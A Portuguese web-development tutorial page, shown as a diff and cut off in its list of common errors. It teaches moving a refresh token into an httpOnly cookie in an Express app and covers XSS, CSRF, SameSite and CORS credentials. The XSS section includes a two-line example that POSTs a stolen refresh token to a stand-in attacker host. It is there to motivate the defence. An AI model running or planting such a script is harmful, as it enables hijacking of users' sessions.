@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cookie httpOnly</title>
+<link rel="stylesheet" href="../styles.css">
+<script src="../scripts.js" defer></script>
+</head>
+<body>
+<button id="toc-show-btn">&#9776; Sumário</button>
+<div class="layout">
+
+<nav class="toc">
+  <button class="toc-hide-btn">Ocultar &times;</button>
+  <a class="toc-prev" href="10-papeis-e-autorizacao.html">&larr; 10. Papéis e autorização</a>
+  <h2>Nesta página</h2>
+  <ol>
+    <li><a href="#o-problema">1. O problema: onde o cliente guarda o token</a></li>
+    <li><a href="#xss">2. XSS, em dois minutos</a></li>
+    <li><a href="#httponly">3. httpOnly: o cookie que o script não lê</a></li>
+    <li><a href="#atributos">4. Os atributos do cookie, um a um</a></li>
+    <li><a href="#estrategia">5. A estratégia: cada token no seu lugar</a></li>
+    <li><a href="#csrf">6. O que entra junto: CSRF</a></li>
+    <li><a href="#samesite">7. SameSite não é sobre origem, é sobre site</a></li>
+    <li><a href="#dependencia">8. Instalando o cookie-parser</a></li>
+    <li><a href="#opcoes-cookie">9. Um lugar só pras opções do cookie</a></li>
+    <li><a href="#login-cookie">10. Login: o refresh sai do corpo</a></li>
+    <li><a href="#refresh-logout">11. Refresh e logout: lendo do cookie</a></li>
+    <li><a href="#cors-credentials">12. CORS com credenciais</a></li>
+    <li><a href="#testando">13. Testando com curl e cookie jar</a></li>
+    <li><a href="#erros-comuns">14. Erros comuns</a></li>
+    <li><a href="#proximos-passos">15. O que vem a seguir</a></li>
+  </ol>
+  <a class="toc-next" href="12-validacao-e-erros.html">12. Validação e erros de domínio &rarr;</a>
+</nav>
+
+<main>
+  <div class="eyebrow">Projeto Studio Fit — Trilha Node + Express — Parte 11</div>
+  <h1>Cookie httpOnly</h1>
+  <p class="subtitle">O refresh token da parte 8 volta no corpo do login, o que obriga o cliente a guardá-lo em algum lugar que o JavaScript enxerga. Um único script malicioso na página leva a sessão de 7 dias inteira — e depois da parte 10, possivelmente a de um admin. Esta parte tira o refresh token do alcance do script.</p>
+
+  <h2 id="o-problema">1. O problema: onde o cliente guarda o token</h2>
+  <p>A parte 8 terminou com o login respondendo isto:</p>
+  <pre><code>{
+  "access_token": "eyJhbGci...",
+  "refresh_token": "9f2c1e4b..."
+}</code></pre>
+  <p>E aí a trilha disse, de propósito, que guardar isso era "problema do cliente, fora do escopo do backend". Hora de encarar: <strong>não é</strong>. A forma como o servidor entrega o token determina onde o cliente <em>consegue</em> guardá-lo, e isso é decisão de segurança do backend.</p>
+  <p>Se o token chega no corpo de um JSON, o front-end só tem opções que o próprio JavaScript enxerga:</p>
+  <table>
+    <thead><tr><th>Onde guardar</th><th>Sobrevive a recarregar a página?</th><th>Um script da página consegue ler?</th></tr></thead>
+    <tbody>
+      <tr><td><code>localStorage</code></td><td>Sim</td><td><span class="badge badge-err">Sim</span> — <code>localStorage.getItem('refresh_token')</code></td></tr>
+      <tr><td><code>sessionStorage</code></td><td>Só na mesma aba</td><td><span class="badge badge-err">Sim</span></td></tr>
+      <tr><td>Variável em memória</td><td>Não — perde tudo no F5</td><td><span class="badge badge-err">Sim</span>, se o script alcançar o escopo</td></tr>
+      <tr><td>Cookie comum (sem <code>httpOnly</code>)</td><td>Sim</td><td><span class="badge badge-err">Sim</span> — <code>document.cookie</code></td></tr>
+      <tr><td><strong>Cookie <code>httpOnly</code></strong></td><td>Sim</td><td><span class="badge badge-ok">Não</span> — invisível pro JavaScript</td></tr>
+    </tbody>
+  </table>
+  <p>Só a última linha resolve, e ela não é uma escolha do front-end: <strong>é o servidor que decide</strong>, mandando o token num header <code>Set-Cookie</code> em vez do corpo da resposta.</p>
+
+  <h2 id="xss">2. XSS, em dois minutos</h2>
+  <p><strong>XSS</strong> (Cross-Site Scripting) é quando um atacante consegue rodar JavaScript dentro da <em>sua</em> página, no navegador do <em>seu</em> usuário. Alguns caminhos comuns:</p>
+  <ul>
+    <li>Um campo de texto que aceita HTML e é exibido sem escapar — o nome do aluno virando <code>&lt;script&gt;...&lt;/script&gt;</code> na tela de outra pessoa.</li>
+    <li>Uma dependência de front-end comprometida. Você instalou 800 pacotes transitivos; basta um.</li>
+    <li>Uma extensão de navegador do usuário com permissão de ler a página.</li>
+  </ul>
+  <p>Uma vez rodando, esse script tem os mesmos poderes que o código legítimo da sua aplicação. Se o refresh token está no <code>localStorage</code>, são duas linhas:</p>
+  <pre><code>fetch('https://servidor-do-atacante.com/roubo', {
+  method: 'POST',
+  body: localStorage.getItem('refresh_token'),
+});</code></pre>
+  <div class="warn">
+    <p>Pense no que esse token vale depois da parte 10: <strong>7 dias de sessão renovável</strong>, e o papel vem relido do banco a cada renovação. Se a vítima for um admin, o atacante tem uma semana de acesso administrativo — e a detecção de reuso da parte 8 só dispara se a vítima e o atacante usarem o mesmo token, o que a rotação silenciosa do atacante evita se ele for esperto.</p>
+  </div>
+  <p>Com o refresh em cookie <code>httpOnly</code>, esse mesmo script continua conseguindo fazer requisições em nome do usuário — não existe bala de prata contra XSS — mas <strong>não consegue extrair o token e usá-lo depois, de outra máquina</strong>. O estrago fica limitado ao tempo em que a vítima está com a página aberta, em vez de virar uma sessão portátil de 7 dias.</p>
+
+  <h2 id="httponly">3. httpOnly: o cookie que o script não lê</h2>
+  <p>Cookie é um par nome/valor que o servidor manda no header <code>Set-Cookie</code>, o navegador guarda, e reenvia automaticamente nas próximas requisições pro mesmo destino. O atributo <code>HttpOnly</code> acrescenta uma regra: <strong>o JavaScript da página não enxerga esse cookie</strong>. Ele não aparece em <code>document.cookie</code>, e não tem API alternativa pra ler.</p>
+  <div class="example">
+    <div class="bad">
+      <h4>Token no corpo do JSON</h4>
+      <p>O front recebe a string, decide onde guardar, e precisa lembrar de anexá-la manualmente em cada requisição. Todo esse caminho é visível pro JavaScript — inclusive pro JavaScript do atacante.</p>
+    </div>
+    <div class="good">
+      <h4>Token no cookie <code>httpOnly</code></h4>
+      <p>O navegador guarda e reenvia sozinho. O front-end nunca vê a string, não precisa gerenciá-la, e um XSS não tem como copiá-la.</p>
+    </div>
+  </div>
+  <p>Repare no efeito colateral bom: o código do front-end <strong>encolhe</strong>. Não tem mais "salvar refresh token", "ler refresh token", "limpar no logout" — o navegador faz tudo.</p>
+
+  <h2 id="atributos">4. Os atributos do cookie, um a um</h2>
+  <p>Um <code>Set-Cookie</code> sem atributos é quase sempre um erro. Os que importam aqui:</p>
+  <table>
+    <thead><tr><th>Atributo</th><th>O que faz</th><th>O que vamos usar</th></tr></thead>
+    <tbody>
+      <tr><td><code>HttpOnly</code></td><td>Esconde o cookie do JavaScript.</td><td><code>true</code> — é o motivo desta parte existir.</td></tr>
+      <tr><td><code>Secure</code></td><td>Só envia o cookie por HTTPS.</td><td><code>true</code> em produção, <code>false</code> em desenvolvimento (senão o cookie some no <code>http://localhost</code>).</td></tr>
+      <tr><td><code>SameSite</code></td><td>Controla se o cookie vai junto em requisições disparadas por <em>outro</em> site. Defesa contra CSRF (seções 6 e 7).</td><td><code>'lax'</code>.</td></tr>
+      <tr><td><code>Path</code></td><td>Em quais caminhos da URL o cookie é enviado.</td><td><code>'/auth'</code> — o refresh só interessa pras rotas de autenticação.</td></tr>
+      <tr><td><code>Max-Age</code></td><td>Quanto tempo o navegador guarda, em milissegundos no Express.</td><td>7 dias, o mesmo prazo do token no banco.</td></tr>
+      <tr><td><code>Domain</code></td><td>Compartilha o cookie com subdomínios.</td><td>Não usamos — sem o atributo, o cookie fica preso ao host exato que o emitiu, que é o mais restrito.</td></tr>
+    </tbody>
+  </table>
+  <div class="rule">
+    <span class="tag">Por que Path: '/auth' importa</span>
+    <p>Sem <code>Path</code>, o cookie vai junto em <strong>toda</strong> requisição pro seu domínio — <code>GET /aulas</code>, <code>POST /alunos</code>, tudo. Mais tráfego à toa e, principalmente, mais superfície: cada rota vira um lugar onde aquele token pode acabar num log de servidor, num proxy, num relatório de erro. Com <code>Path: '/auth'</code>, o navegador só anexa o cookie em <code>/auth/*</code> — exatamente as duas rotas que precisam dele.</p>
+    <p>O detalhe que morde: <code>Path</code> faz parte da <strong>identidade</strong> do cookie. Apagar um cookie criado com <code>path: '/auth'</code> exige passar o mesmo <code>path</code> no <code>clearCookie</code> — senão o navegador entende que você está apagando outro cookie, e o original continua lá (seção 11).</p>
+  </div>
+
+  <h2 id="estrategia">5. A estratégia: cada token no seu lugar</h2>
+  <p>Decisão importante e que costuma confundir: <strong>só o refresh token vai pro cookie</strong>. O access token continua voltando no corpo do JSON.</p>
+  <table>
+    <thead><tr><th></th><th>Access token</th><th>Refresh token</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Como volta do login</strong></td><td>No corpo da resposta.</td><td>No header <code>Set-Cookie</code>.</td></tr>
+      <tr><td><strong>Onde o cliente guarda</strong></td><td>Em memória (variável da aplicação).</td><td>Não guarda — o navegador cuida.</td></tr>
+      <tr><td><strong>Como é enviado</strong></td><td>Header <code>Authorization: Bearer</code>, escrito à mão pelo cliente.</td><td>Automaticamente pelo navegador, só em <code>/auth/*</code>.</td></tr>
+      <tr><td><strong>Se vazar</strong></td><td>15 minutos de estrago.</td><td>7 dias — por isso é ele que sai do alcance do script.</td></tr>
+    </tbody>
+  </table>
+  <p>A lógica: o token de vida longa fica onde o script não alcança; o de vida curta fica onde é prático, porque o dano de perdê-lo é limitado e ele precisa ser anexado manualmente em cada chamada mesmo.</p>
+  <div class="callout">
+    <p>Um efeito colateral bem-vindo: como o access token vive só em memória, recarregar a página perde ele — e o front-end resolve chamando <code>POST /auth/refresh</code> logo no carregamento. O cookie vai sozinho, um access token novo volta, e o usuário nem percebe. Esse "silent refresh" é o padrão em aplicações que usam essa estratégia, e só funciona porque o refresh sobrevive ao F5 dentro do cookie.</p>
+  </div>
+
+  <h2 id="csrf">6. O que entra junto: CSRF</h2>
+  <p>Cookie tem uma característica que é conveniência e problema ao mesmo tempo: <strong>o navegador o envia automaticamente</strong>, sem o JavaScript pedir. Inclusive quando quem dispara a requisição é outro site.</p>
+  <p><strong>CSRF</strong> (Cross-Site Request Forgery) é isso: a vítima está logada no seu sistema, visita <code>site-qualquer.com</code>, e uma página de lá dispara uma requisição pra sua API. O navegador anexa o cookie, e o servidor vê uma requisição autenticada que o usuário nunca quis fazer.</p>
+  <div class="step">
+    <div class="step-number">1</div>
+    <h3>A vítima tem sessão ativa</h3>
+    <p>Cookie de refresh guardado no navegador, válido por 7 dias.</p>
+  </div>
+  <div class="step">
+    <div class="step-number">2</div>
+    <h3>Ela abre um site malicioso</h3>
+    <p>Que contém um formulário ou um <code>fetch</code> apontando pro seu <code>POST /auth/refresh</code>.</p>
+  </div>
+  <div class="step">
+    <div class="step-number">3</div>
+    <h3>O navegador anexa o cookie</h3>
+    <p>Porque é assim que cookie funciona — a requisição chega no seu servidor devidamente autenticada.</p>
+  </div>
+  <div class="step">
+    <div class="step-number">4</div>
+    <h3>Mas o atacante não lê a resposta</h3>
+    <p>A <em>same-origin policy</em> da parte 9 impede o JavaScript dele de ler o corpo da resposta. Ele consegue <strong>causar</strong> a requisição, não <strong>ver</strong> o resultado.</p>
+  </div>
+  <p>Isso muda bastante o cálculo de risco no nosso caso específico:</p>
+  <table>
+    <thead><tr><th>O atacante consegue…</th><th>Impacto aqui</th></tr></thead>
+    <tbody>
+      <tr><td>Disparar <code>POST /auth/refresh</code> em nome da vítima</td><td>O token roda (parte 8: cada refresh revoga o anterior). O atacante não vê o novo par, mas a vítima é deslogada — <strong>incômodo, não roubo</strong>.</td></tr>
+      <tr><td>Disparar <code>POST /auth/logout</code></td><td>Desloga a vítima. Mesmo tipo de dano.</td></tr>
+      <tr><td>Disparar <code>POST /aulas/:id/matriculas</code></td><td><span class="badge badge-ok">Não</span> — essa rota exige <code>Authorization: Bearer</code>, header que o navegador <strong>não</strong> anexa sozinho. Nenhuma rota de negócio depende de cookie.</td></tr>
+      <tr><td>Ler qualquer resposta</td><td><span class="badge badge-ok">Não</span> — CORS e same-origin policy barram.</td></tr>
+    </tbody>
+  </table>
+  <p>Ou seja: manter o access token em header e só o refresh em cookie limita o CSRF a "conseguem derrubar a sessão da vítima". Chato, não catastrófico. Mesmo assim, dá pra fechar quase de graça com o <code>SameSite</code> — próxima seção.</p>
+  <div class="rule">
+    <span class="tag">Por que não vamos implementar token anti-CSRF</span>
+    <p>A defesa clássica e completa é o <em>double submit cookie</em> ou um token sincronizado: o servidor emite um valor aleatório que o front lê e reenvia num header, e como um site externo não consegue ler o cookie da vítima, ele não consegue forjar o header. É a solução certa quando cookies autenticam <strong>ações de negócio</strong>. No nosso desenho, as ações de negócio usam <code>Authorization</code>, e o cookie só alcança duas rotas cujo pior caso é deslogar o usuário. <code>SameSite=Lax</code> cobre esse risco com uma linha, e adicionar toda a maquinaria anti-CSRF traria complexidade sem dano equivalente a evitar. Se um dia alguma rota de escrita passar a se autenticar por cookie, essa conta muda — e aí o token anti-CSRF deixa de ser opcional.</p>
+  </div>
+
+  <h2 id="samesite">7. SameSite não é sobre origem, é sobre site</h2>
+  <p><code>SameSite</code> instrui o navegador sobre quando <strong>não</strong> anexar o cookie: se a requisição foi originada por outro site, ele fica em casa. Três valores:</p>
+  <table>
+    <thead><tr><th>Valor</th><th>Comportamento</th></tr></thead>
+    <tbody>
+      <tr><td><code>Strict</code></td><td>Nunca envia em requisição vinda de outro site — nem quando o usuário clica num link legítimo. Mais seguro, e quebra fluxos de "voltar pro app a partir de um email".</td></tr>
+      <tr><td><code>Lax</code> <span class="badge badge-ok">escolhido</span></td><td>Envia em navegação de topo com <code>GET</code> (clicar num link), <strong>não</strong> envia em <code>POST</code> disparado por outro site. Como nossas rotas de cookie são <code>POST</code>, isso já barra o CSRF da seção 6.</td></tr>
+      <tr><td><code>None</code></td><td>Envia sempre, inclusive cross-site. Exige <code>Secure</code> obrigatoriamente. Necessário quando front e API estão em <strong>sites</strong> diferentes.</td></tr>
+    </tbody>
+  </table>
+  <div class="warn">
+    <p><strong>Aqui mora a confusão que faz gente perder horas:</strong> "same-site" e "same-origin" são coisas diferentes. <em>Origem</em> (parte 9, CORS) é esquema + host + <strong>porta</strong>. <em>Site</em> é só o domínio registrável — porta não conta, e subdomínio também não.</p>
+  </div>
+  <table>
+    <thead><tr><th>Front-end</th><th>API</th><th>Same-origin?</th><th>Same-site?</th><th>Cookie vai com <code>Lax</code>?</th></tr></thead>
+    <tbody>
+      <tr><td><code>localhost:5173</code></td><td><code>localhost:3000</code></td><td><span class="badge badge-err">não</span> (porta difere)</td><td><span class="badge badge-ok">sim</span></td><td>Sim</td></tr>
+      <tr><td><code>app.studiofit.com</code></td><td><code>api.studiofit.com</code></td><td><span class="badge badge-err">não</span></td><td><span class="badge badge-ok">sim</span> (<code>studiofit.com</code>)</td><td>Sim</td></tr>
+      <tr><td><code>studiofit.com</code></td><td><code>studiofit-api.net</code></td><td><span class="badge badge-err">não</span></td><td><span class="badge badge-err">não</span></td><td>Não — precisaria <code>None; Secure</code></td></tr>
+    </tbody>
+  </table>
+  <p>Traduzindo pro nosso caso: em desenvolvimento (portas diferentes no <code>localhost</code>) e em produção com subdomínios do mesmo domínio, <code>Lax</code> funciona. Só um front hospedado em domínio completamente separado exigiria <code>None; Secure</code> — e aí o CSRF volta pra mesa, junto com a necessidade do token anti-CSRF discutido acima.</p>
+
+  <h2 id="dependencia">8. Instalando o cookie-parser</h2>
+  <p>O Express sabe <strong>escrever</strong> cookies sozinho (<code>res.cookie</code>), mas não sabe <strong>ler</strong>: sem ajuda, o cookie chega como uma string crua no header <code>Cookie</code> e você teria que fatiar na mão. O <code>cookie-parser</code> transforma isso em <code>req.cookies</code>.</p>
+  <div class="edit-step">
+    <p><span class="action action-new">Rodar</span> na raiz do projeto:</p>
+  </div>
+  <pre><code>npm install cookie-parser</code></pre>
+  <div class="edit-step">
+    <p><span class="action action-edit">Alterar</span> <span class="file">index.js</span> — no bloco de <code>require</code> do topo, junto do <code>helmet</code> e do <code>corsConfigurado</code> da parte 9:</p>
+  </div>
+  <pre><code><span class="ln-ctx">const helmet = require('helmet');</span>
+<span class="ln-add">const cookieParser = require('cookie-parser');</span>
+<span class="ln-ctx">const corsConfigurado = require('./middlewares/cors');</span></code></pre>
+  <div class="edit-step">
+    <p><span class="action action-edit">Alterar</span> <span class="file">index.js</span> — na pilha de middlewares, logo depois do <code>express.json</code>. A ordem importa pelo mesmo motivo da parte 9: o parser precisa rodar antes das rotas que vão ler <code>req.cookies</code>:</p>
+  </div>
+  <pre><code><span class="ln-ctx">app.use(helmet());
+app.use(corsConfigurado);
+app.use(limitadorGlobal);
+app.use(express.json({ limit: '10kb' }));</span>
+<span class="ln-add">app.use(cookieParser());</span></code></pre>
+
+  <h2 id="opcoes-cookie">9. Um lugar só pras opções do cookie</h2>
+  <p>As opções do cookie vão aparecer em três lugares (login de aluno, login de instrutor, refresh) e precisam bater <strong>exatamente</strong> — inclusive no <code>clearCookie</code> do logout. Divergir num atributo cria um cookie diferente em vez de sobrescrever o antigo. Então elas nascem centralizadas.</p>
+  <div class="edit-step">
+    <p><span class="action action-edit">Alterar</span> <span class="file">services/tokenService.js</span> — adicione a constante e a função no fim do arquivo, antes do <code>module.exports</code>, e inclua o novo nome na exportação:</p>
+  </div>
+  <pre><code><span class="ln-ctx">// ...gerarRefreshToken, hashRefreshToken e calcularExpiracao continuam iguais</span>
+
+<span class="ln-add">const COOKIE_REFRESH = 'refresh_token';
+
+function opcoesCookieRefresh() {
+  return {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'lax',
+    path: '/auth',
+    maxAge: DIAS_DE_VALIDADE * 24 * 60 * 60 * 1000,
+  };
+}</span>
+
+<span class="ln-del">module.exports = { gerarRefreshToken, hashRefreshToken, calcularExpiracao };</span>
+<span class="ln-add">module.exports = {
+  gerarRefreshToken,
+  hashRefreshToken,
+  calcularExpiracao,
+  opcoesCookieRefresh,
+  COOKIE_REFRESH,
+};</span></code></pre>
+  <p><code>DIAS_DE_VALIDADE</code> é a constante que já existe no arquivo desde a parte 8 — reusá-la garante que o prazo do cookie no navegador e o <code>expira_em</code> no banco nunca saiam de sincronia.</p>
+  <div class="warn">
+    <p><code>secure: process.env.NODE_ENV === 'production'</code> merece atenção: com <code>Secure</code> ligado, o navegador <strong>só</strong> manda o cookie por HTTPS. Se você deixar <code>true</code> fixo e testar em <code>http://localhost</code>, o cookie é criado e nunca mais volta — e o sintoma é um <code>400 "refresh_token é obrigatório"</code> que parece bug de código. Deixar <code>false</code> fixo é o erro inverso, e pior: em produção o token trafega em texto puro. A expressão amarra o valor ao ambiente e não depende de ninguém lembrar de trocar.</p>
+  </div>
+
+  <h2 id="login-cookie">10. Login: o refresh sai do corpo</h2>
+  <div class="edit-step">
+    <p><span class="action action-edit">Alterar</span> <span class="file">routes/auth.js</span> — no topo, acrescente os dois nomes novos à desestruturação do <code>tokenService</code> que já existe:</p>
+  </div>
+  <pre><code><span class="ln-del">const {
+  gerarRefreshToken,
+  hashRefreshToken,
+  calcularExpiracao,
+} = require('../services/tokenService');</span>
+<span class="ln-add">const {
+  gerarRefreshToken,
+  hashRefreshToken,
+  calcularExpiracao,
+  opcoesCookieRefresh,
+  COOKIE_REFRESH,
+} = require('../services/tokenService');</span></code></pre>
+  <p>Agora a mudança central. As três rotas que hoje fazem <code>res.json(tokens)</code> passam a mandar o refresh no cookie e só o access no corpo. Pra não repetir isso três vezes, uma função auxiliar ao lado do <code>emitirTokens</code>:</p>
+  <div class="edit-step">
+    <p><span class="action action-new">Adicionar</span> <span class="file">routes/auth.js</span> — logo <strong>depois</strong> da função <code>emitirTokens</code> e antes do <code>router.post('/login', ...)</code>:</p>
+  </div>
+  <pre><code>function responderComTokens(res, tokens) {
+  res.cookie(COOKIE_REFRESH, tokens.refresh_token, opcoesCookieRefresh());
+  res.json({ access_token: tokens.access_token });
+}</code></pre>
+  <div class="edit-step">
+    <p><span class="action action-edit">Alterar</span> <span class="file">routes/auth.js</span> — em <code>router.post('/login', ...)</code>, a última linha do handler:</p>
+  </div>
+  <pre><code>  const tokens = await emitirTokens({ id: aluno.id, papel: 'aluno' });
+
+<span class="ln-del">  res.json(tokens);</span>
+<span class="ln-add">  responderComTokens(res, tokens);</span>
+});</code></pre>
+  <div class="edit-step">
+    <p><span class="action action-edit">Alterar</span> <span class="file">routes/auth.js</span> — em <code>router.post('/instrutores/login', ...)</code>, a última linha do handler, do mesmo jeito:</p>
+  </div>
+  <pre><code>  const tokens = await emitirTokens({
+    id: instrutor.id,
+    papel: instrutor.papel,
+  });
+
+<span class="ln-del">  res.json(tokens);</span>
+<span class="ln-add">  responderComTokens(res, tokens);</span>
+});</code></pre>
+  <div class="example">
+    <div class="bad">
+      <h4>Resposta antes</h4>
+      <pre><code>{
+  "access_token": "eyJ...",
+  "refresh_token": "9f2c..."
+}</code></pre>
+    </div>
+    <div class="good">
+      <h4>Resposta agora</h4>
+      <pre><code>Set-Cookie: refresh_token=9f2c...;
+  Max-Age=604800; Path=/auth;
+  HttpOnly; SameSite=Lax
+
+{ "access_token": "eyJ..." }</code></pre>
+    </div>
+  </div>
+  <p>Segunda quebra de contrato da trilha (a primeira foi na parte 8, quando <code>token</code> virou <code>access_token</code>). Vale a mesma observação: num sistema com clientes em produção, isso exigiria versionamento ou um período mandando o token nos dois lugares. Aqui o único cliente é o seu <code>curl</code>.</p>
+
+  <h2 id="refresh-logout">11. Refresh e logout: lendo do cookie</h2>
+  <div class="edit-step">
+    <p><span class="action action-edit">Alterar</span> <span class="file">routes/auth.js</span> — em <code>router.post('/refresh', ...)</code>, as duas primeiras linhas do handler. O token deixa de vir do body:</p>
+  </div>
+  <pre><code>router.post('/refresh', async (req, res) => {
+<span class="ln-del">  const { refresh_token } = req.body;</span>
+<span class="ln-add">  const refresh_token = req.cookies[COOKIE_REFRESH];</span>
+
+  if (!refresh_token) {
+<span class="ln-del">    return res.status(400).json({ erro: 'refresh_token é obrigatório' });</span>
+<span class="ln-add">    return res.status(401).json({ erro: 'Refresh token ausente' });</span>
+  }</code></pre>
+  <div class="rule">
+    <span class="tag">Por que o 400 virou 401</span>
+    <p>Antes, faltar o <code>refresh_token</code> era erro de formato da requisição — o cliente esqueceu um campo obrigatório do corpo, e <code>400</code> estava certo. Agora quem manda o token é o navegador, automaticamente; se ele não veio, é porque não existe sessão (cookie expirado, apagado, ou nunca criado). Isso é falta de autenticação, e <code>401</code> descreve a situação com honestidade — inclusive pro front-end, que trata <code>401</code> mandando o usuário pro login e trataria <code>400</code> como bug.</p>
+  </div>
+  <div class="edit-step">
+    <p><span class="action action-edit">Alterar</span> <span class="file">routes/auth.js</span> — ainda em <code>/refresh</code>, a última linha do handler, pra devolver o par novo do jeito novo (rotação da parte 8 continua igual: o cookie é sobrescrito com o token novo):</p>
+  </div>
+  <pre><code>  const tokens = await emitirTokens(dono);
+<span class="ln-del">  res.json(tokens);</span>
+<span class="ln-add">  responderComTokens(res, tokens);</span>
+});</code></pre>
+  <div class="edit-step">
+    <p><span class="action action-edit">Alterar</span> <span class="file">routes/auth.js</span> — <code>router.post('/logout', ...)</code>. O handler inteiro muda: lê do cookie, e agora também precisa <strong>apagar</strong> o cookie do navegador, não só revogar no banco:</p>
+  </div>
+  <pre><code>router.post('/logout', async (req, res) => {
+<span class="ln-del">  const { refresh_token } = req.body;
+
+  if (!refresh_token) {
+    return res.status(400).json({ erro: 'refresh_token é obrigatório' });
+  }
+
+  const registro = await refreshTokensRepository.buscarPorHash(
+    hashRefreshToken(refresh_token),
+  );
+
+  if (registro) {
+    await refreshTokensRepository.revogar(registro.id);
+  }
+
+  res.status(204).send();</span>
+<span class="ln-add">  const refresh_token = req.cookies[COOKIE_REFRESH];
+
+  if (refresh_token) {
+    const registro = await refreshTokensRepository.buscarPorHash(
+      hashRefreshToken(refresh_token),
+    );
+
+    if (registro) {
+      await refreshTokensRepository.revogar(registro.id);
+    }
+  }
+
+  res.clearCookie(COOKIE_REFRESH, { path: '/auth' });
+  res.status(204).send();</span>
+});</code></pre>
+  <p>Duas coisas mudaram de propósito:</p>
+  <ul>
+    <li><strong>Sem cookie não é mais erro.</strong> A rota responde <code>204</code> de qualquer jeito — o logout continua idempotente (parte 8), e agora "não tinha sessão" é só mais um caminho pro mesmo resultado desejado.</li>
+    <li><strong>O <code>path</code> reaparece no <code>clearCookie</code>.</strong> Sem ele, o navegador tenta apagar um cookie <code>refresh_token</code> de <code>Path=/</code>, que não existe — e o de <code>/auth</code> sobrevive intacto. O token estaria revogado no banco (então inútil), mas o cookie morto ficaria no navegador até expirar, e cada <code>/auth/refresh</code> gastaria uma ida ao banco pra descobrir isso.</li>
+  </ul>
+
+  <h2 id="cors-credentials">12. CORS com credenciais</h2>
+  <p>Falta um detalhe sem o qual nada disso funciona num front-end de verdade: por padrão, o navegador <strong>não</strong> envia cookies em requisições cross-origin feitas por JavaScript, mesmo que o <code>SameSite</code> permita. Duas pontas precisam concordar.</p>
+  <div class="edit-step">
+    <p><span class="action action-edit">Alterar</span> <span class="file">middlewares/cors.js</span> — dentro do objeto passado pro <code>cors(...)</code>, adicione a opção:</p>
+  </div>
+  <pre><code>const corsConfigurado = cors({
+  origin: origensPermitidas,
+  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Authorization'],
+<span class="ln-add">  credentials: true,</span>
+});</code></pre>
+  <p>Isso faz o servidor responder <code>Access-Control-Allow-Credentials: true</code>. Do lado do front, a chamada precisa pedir explicitamente:</p>
+  <pre><code>fetch('http://localhost:3000/auth/refresh', {
+  method: 'POST',
+  credentials: 'include',
+});</code></pre>
+  <div class="warn">
+    <p>Com <code>credentials: true</code>, o navegador passa a <strong>rejeitar</strong> respostas com <code>Access-Control-Allow-Origin: *</code>. Não é capricho: liberar credenciais pra qualquer origem seria entregar a sessão do usuário pra qualquer site. Como a parte 9 já configurou uma lista explícita de origens em vez de <code>'*'</code>, o projeto já está do lado certo — mas se um dia alguém "simplificar" o CORS pra <code>origin: '*'</code>, o login para de funcionar no navegador e o erro não vai dizer que a culpa é dessa linha.</p>
+  </div>
+
+  <h2 id="testando">13. Testando com curl e cookie jar</h2>
+  <p>Cookie muda a forma de testar: o <code>curl</code> precisa guardar e reenviar, com <code>-c</code> (grava num arquivo) e <code>-b</code> (lê do arquivo).</p>
+  <pre><code># login gravando o cookie num arquivo
+curl -i -c cookies.txt -X POST http://localhost:3000/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"carla@example.com","senha":"senha123"}'
+# procure na resposta:
+#   Set-Cookie: refresh_token=...; Max-Age=604800; Path=/auth; HttpOnly; SameSite=Lax
+# e no corpo: SÓ access_token, sem refresh_token</code></pre>
+  <p>Confira o que ficou guardado — o arquivo mostra os atributos como o navegador os enxerga:</p>
+  <pre><code>cat cookies.txt
+# linha com: localhost  FALSE  /auth  FALSE  <timestamp>  refresh_token  9f2c...
+#                              ^path         ^expiração</code></pre>
+  <pre><code># refresh SEM mandar nada no corpo — o cookie vai sozinho
+curl -i -b cookies.txt -c cookies.txt -X POST http://localhost:3000/auth/refresh
+# 200, access_token novo no corpo, e um Set-Cookie novo (rotação da parte 8)
+
+# refresh SEM o cookie
+curl -s -w "\n%{http_code}\n" -X POST http://localhost:3000/auth/refresh
+# 401, "Refresh token ausente"</code></pre>
+  <div class="callout">
+    <p>O <code>-b cookies.txt -c cookies.txt</code> junto não é redundância: <code>-b</code> envia o cookie atual e <code>-c</code> regrava o arquivo com o cookie novo que veio na resposta. Sem o <code>-c</code>, o arquivo continuaria com o token antigo — que a rotação acabou de revogar — e a próxima chamada dispararia a detecção de reuso da parte 8. Vale como demonstração: rode o refresh duas vezes seguidas só com <code>-b</code> e veja o <code>401</code>.</p>
+  </div>
+  <pre><code># o path funciona? o cookie NÃO deve ir pra rotas fora de /auth
+curl -s -b cookies.txt -o /dev/null -w "%{http_code}\n" http://localhost:3000/aulas
+# 200 (rota pública) — e o servidor não recebeu cookie nenhum
+
+# logout: revoga no banco E apaga o cookie
+curl -i -b cookies.txt -c cookies.txt -X POST http://localhost:3000/auth/logout
+# 204, com Set-Cookie: refresh_token=; Expires=Thu, 01 Jan 1970...
+# (é assim que se apaga um cookie: reenviar vazio e com data no passado)
+
+# depois do logout, o refresh não tem mais o que mandar
+curl -s -w "\n%{http_code}\n" -b cookies.txt -X POST http://localhost:3000/auth/refresh
+# 401</code></pre>
+  <p>E a regressão que importa — nada do que dependia de <code>Authorization</code> mudou:</p>
+  <pre><code># pega um access token novo e usa numa rota protegida
+curl -s -c cookies.txt -X POST http://localhost:3000/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"carla@example.com","senha":"senha123"}'
+# copie o access_token da resposta
+
+curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:3000/aulas/1/matriculas \
+  -H "Authorization: Bearer ACCESS_AQUI"
+# 201 ou 409 (se já matriculado) — nunca 401</code></pre>
+
+  <h2 id="erros-comuns">14. Erros comuns</h2>
+  <ol>
+    <li><strong><code>secure: true</code> fixo em desenvolvimento</strong> — o cookie é criado e nunca volta em <code>http://localhost</code>. O sintoma é um <code>401</code> teimoso no refresh, sem nada de errado no código (seção 9).</li>
+    <li><strong><code>clearCookie</code> sem o mesmo <code>path</code></strong> — o navegador apaga um cookie que não existe e mantém o verdadeiro. <code>path</code>, <code>domain</code> e o nome formam a identidade do cookie (seção 4).</li>
